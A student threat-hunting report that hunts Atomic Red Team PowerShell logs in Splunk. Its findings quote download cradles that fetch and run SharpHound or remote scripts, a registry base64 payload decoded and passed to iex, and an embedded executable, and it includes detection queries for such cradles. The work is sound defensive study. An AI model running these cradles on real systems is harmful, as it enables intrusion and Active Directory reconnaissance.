Assignment 2 Week 5 Karabalin Bakhtiyar and Tulepbergen Beksultan

# Threat Hunting Concept: Hunting for Suspicious PowerShell Activity in Splunk

## Summary

In this assignment we compared the two main hunting models (intel-driven and hypothesis-driven) and ran a **hypothesis-driven hunt** for suspicious PowerShell activity. Splunk Enterprise was deployed in Docker on Kali Linux, and a public Atomic Red Team dataset (T1059.001) was loaded into it: 21,714 Sysmon events and 170,846 PowerShell log events. Five searches were run. They found **186 PowerShell launches**, **51 events** with suspicious flags (encoded commands, download cradles) and script blocks containing download cradles and base64 payloads. **The hypothesis was confirmed** on the lab data.

----------

## 1. Hunting Models and Our Hypothesis

| | Intel-driven hunting | Hypothesis-driven hunting |
|---|---|---|
| Starts from | Threat intelligence (IOCs, reports, feeds) | An assumption about attacker behavior, usually from MITRE ATT&CK |
| Question | "Are these known indicators present in our logs?" | "If an attacker is inside, how would they abuse this technique and what would it leave behind?" |
| Strength | Fast and precise for known threats | Finds new tradecraft that has no known indicators |
| Weakness | Indicators expire quickly | Needs good telemetry; more noise |
| In this course | IOCs stored in MISP (Week 3) | The PowerShell hunt in this report |

**Hypothesis.** An attacker who has code execution on a Windows host uses PowerShell to run code stealthily, through encoded commands (`-EncodedCommand`) and download cradles (`DownloadString`, `Invoke-Expression`) that fetch and run a payload in memory.

| ATT&CK technique | ID | What we look for |
|---|---|---|
| PowerShell | T1059.001 | `powershell.exe` with suspicious arguments |
| Obfuscated Files or Information | T1027 | Base64 payloads, abbreviated parameters |
| Deobfuscate/Decode Files or Information | T1140 | `FromBase64String` followed by `Invoke-Expression` |
| Ingress Tool Transfer | T1105 | `DownloadString`, `DownloadFile` |
| Windows Management Instrumentation | T1047 | PowerShell started by `WmiPrvSE.exe` |

**Data sources:** Sysmon Event ID 1 (process creation) and PowerShell Script Block Logging (Event 4104).

----------

## 2. Lab Setup

### Step 1. Start Splunk in Docker

Splunk was started as a container on the same Kali machine that runs the MISP stack from Week 3:

```bash
sudo docker run -d --name splunk \
  -p 8000:8000 -p 8089:8089 \
  -e SPLUNK_START_ARGS="--accept-license" \
  -e SPLUNK_GENERAL_TERMS="--accept-sgt-current-at-splunk-com" \
  -e SPLUNK_PASSWORD="<lab password>" \
  -v splunk-var:/opt/splunk/var \
  -v splunk-etc:/opt/splunk/etc \
  splunk/splunk:latest
```

The `splunk` container is running next to the MISP containers:

![Figure 1. Running containers: splunk and the MISP stack](<Screens/screen1.png>)

*Figure 1. `docker ps` output.*

### Step 2. Log in to Splunk Web

The web interface is available at `http://localhost:8000`.

![Figure 2. Splunk Enterprise home page](<Screens/screen2.png>)

*Figure 2. Splunk home page after login.*

### Step 3. Create an index

All data was stored in a separate index called `windows`.

![Figure 3. Index windows created](<Screens/screen3.png>)

*Figure 3. Splunk confirms: Index "windows" added.*

### Step 4. Download the dataset

We used the Atomic Red Team data for technique T1059.001 from the public `splunk/attack_data` repository.

![Figure 4. Dataset downloaded](<Screens/screen4.png>)

*Figure 4. Both files downloaded: `sysmon.log` (38 MB) and `powershell.log` (6 MB).*

### Step 5. Load the data into Splunk

The files were copied into the container and ingested into the `windows` index.

![Figure 5. Data ingestion commands](<Screens/screen5.png>)

*Figure 5. Splunk accepted both files (`Oneshot ... added`).*

### Step 6. Check that the data is there

![Figure 6. Both log sources are in the index](<Screens/screen6.png>)

*Figure 6. 192,560 events in total, from two sources: PowerShell/Operational (170,846) and Sysmon/Operational (21,714). The time range is set to All time.*

**Note.** Sysmon events are XML, so fields (`Image`, `CommandLine`, `ParentImage`) are extracted with `rex` at search time. Timestamps in Splunk show the time of loading (2026-10-06), not the original 2021 event time.

----------

## 3. Hunting: Queries and Results

### Query 1. All PowerShell launches (baseline)

*Goal: see every time PowerShell was started and by which parent process.*

![Figure 7. Query 1, all PowerShell launches](<Screens/screen7.png>)

**Result: 186 PowerShell launches** on the host `win-dc-974.attackrange.local`. The first rows are already interesting: PowerShell started by `WmiPrvSE.exe` with `/NoProfile /EncodedCommand` and a base64 string. The parameter name is written in many shortened forms (`/EncodedCo`, `/EncodedCom`, `/EncodedComm`, ...).

### Query 2. Suspicious flags (main hunt)

*Goal: keep only launches with encoded commands, hidden or bypass switches and download cradles.*

```spl
index=windows
| rex field=_raw "<EventID>(?<EventID>\d+)</EventID>"
| search EventID=1
| rex field=_raw "<Computer>(?<Computer>[^<]*)</Computer>"
| rex field=_raw "<Data Name=.Image.>(?<Image>[^<]*)"
| rex field=_raw "<Data Name=.CommandLine.>(?<CommandLine>[^<]*)"
| rex field=_raw "<Data Name=.ParentImage.>(?<ParentImage>[^<]*)"
| search Image="*powershell.exe"
| search CommandLine="*-enc*" OR CommandLine="*EncodedCommand*" OR CommandLine="*hidden*" OR CommandLine="*bypass*" OR CommandLine="*DownloadString*" OR CommandLine="*IEX*" OR CommandLine="*Invoke-WebRequest*"
| stats count values(CommandLine) as commands by Computer ParentImage
| sort - count
```

![Figure 8. Query 2, suspicious PowerShell command lines](<Screens/Снимок_экрана_2026-10-06_231058.png>)

**Result: 51 matching events in 5 groups.** The two largest groups:

| Parent process | Count | What we see |
|---|---|---|
| `powershell.exe` | 17 | `-NoProfile -Enc`, `-Enco`, `-Encod`, ... (every shortened form of `-EncodedCommand`), commands built with `Out-ATHPowerShellCommandLineParameter`, and a script downloaded from `raw.githubusercontent.com` |
| `WmiPrvSE.exe` | 15 | `powershell.exe -NoProfile -Enc <base64>` and the same shortened forms |

### Query 3. Who starts PowerShell? (parent process analysis)

*Goal: find unusual parent processes (for example Office or script hosts).*

![Figure 9. Query 3, parent processes (table)](<Screens/Снимок_экрана_2026-10-06_231258.png>)

![Figure 10. Query 3, parent processes (bar chart)](<Screens/Снимок_экрана_2026-10-06_232155.png>)

**Result:**

| Parent process | Launches |
|---|---|
| `SplunkUniversalForwarder\bin\splunkd.exe` | 68 |
| `System32\wbem\WmiPrvSE.exe` | 57 |
| `WindowsPowerShell\v1.0\powershell.exe` | 33 |
| `System32\cmd.exe` | 12 |
| `explorer.exe` | 1 |

No Office or script-host parent (`winword.exe`, `excel.exe`, `wscript.exe`, `mshta.exe`) appears, so the phishing-style vector is **not present** in this data. The parent process was extracted for 171 of 186 launches.

### Query 4. What PowerShell log events exist?

*Goal: check which event types the PowerShell log contains, to know if Script Block Logging (4104) is available.*

![Figure 11. Query 4, PowerShell event codes](<Screens/Снимок_экрана_2026-10-06_231558.png>)

**Result:** 170,846 events in 14 event types. Most are start and stop markers (4105 and 4106). **Event 4104 (Script Block Logging) is present with 319 events**, which means we can read the code that PowerShell actually ran.

### Query 5. Suspicious content inside scripts

*Goal: search script text for download cradles and base64 decoding.*

![Figure 12. Query 5, suspicious script content](<Screens/Снимок_экрана_2026-10-06_231943.png>)

**Result:** 33 matching events; the top 20 distinct lines were reviewed (next section).

----------

## 4. Findings

### 4.1 Suspicious script content (from Query 5)

| # | What was found | What it does | ATT&CK |
|---|---|---|---|
| 1 | `IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/.../SharpHound.ps1')` | Downloads a script and runs it in memory. SharpHound collects Active Directory information | T1059.001, T1105 |
| 2 | `(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e', ...)` then `[ScriptBlock]::Create(...)` | Downloads from a shortened link that hides the real address, then builds and runs the script | T1105, T1027 |
| 3 | `iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))` | Reads a base64 payload from the registry, decodes and runs it, so no payload file is stored on disk | T1140, T1027 |
| 4 | `$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/...'` | Script that uses the PowerSploit post-exploitation framework | T1105 |
| 5 | `$TemplateSourceBytes = [Convert]::FromBase64String('TVqQAAMAAAAEAAAA...')` | Base64 that starts with `TVqQ` is how the `MZ` header of a Windows executable looks in base64, so an executable is embedded in the script | T1027, T1140 |

### 4.2 Findings from the process tree (Queries 1 to 3)

1. **Encoded commands started through WMI.** `WmiPrvSE.exe` started PowerShell 57 times, and 15 of those events are in the suspicious-flag results. PowerShell launched by WMI is a known pattern of remote execution (T1047) and needs an explanation.
2. **Shortened parameters.** The command lines use `-Enc`, `-Enco`, `-Encod` and so on, with both `-` and `/` prefixes. PowerShell accepts any unambiguous prefix of a parameter name, so a rule that looks only for the full word `-EncodedCommand` would miss these.
3. **PowerShell starting PowerShell.** 33 launches have `powershell.exe` as the parent, 17 of them with suspicious flags.
4. **Normal background activity.** The biggest parent is `splunkd.exe` (68 launches), most likely the Splunk forwarder running its own scripts. It should be checked and allowlisted so it does not drown real alerts.
5. **No Office or script-host parents** were found.

### 4.3 Result for the hypothesis

| Part of the hypothesis | Result |
|---|---|
| Encoded commands | Confirmed |
| Download cradles | Confirmed |
| In-memory or registry-stored payloads | Confirmed |
| Phishing-style start from Office or script hosts | Not observed |

**Conclusion: the hypothesis is confirmed on the lab data.** All positive findings come from Atomic Red Team, so they are simulated tests and not a real intrusion.

### 4.4 Limitations

- The dataset is a simulation of one host, so real false-positive rates are unknown.
- Splunk timestamps show the time of loading, so no timeline analysis was done.
- Each line of the PowerShell log was indexed as a separate event, so scripts had to be searched as text.

----------

## 5. Recommendations

1. **Alert on PowerShell started by `WmiPrvSE.exe`** with encoded arguments.
2. **Detect encoded commands by pattern, not by exact text,** so that shortened parameters and both `-` and `/` prefixes are covered. Example to test before use: `| regex CommandLine="(?i)\s[-/](e|ec|en\w*)\s+[A-Za-z0-9+/=]{20,}"`
3. **Alert on download cradles** (`DownloadString`, `DownloadFile`, `Net.WebClient` together with `IEX`).
4. **Allowlist known-good parents,** such as the Splunk forwarder, after checking them.
5. **Keep Script Block Logging and Sysmon process creation enabled** on every endpoint. Both were essential for this hunt.

----------

## Sources

- Course assignment reading: Microsoft Threat Hunting Guide; P. Smith, *Practical Threat Hunting*; SANS Threat Hunting Summit.
- MITRE ATT&CK (attack.mitre.org): T1059.001, T1027, T1140, T1105, T1047.
- Splunk `attack_data` repository, Atomic Red Team dataset for T1059.001.
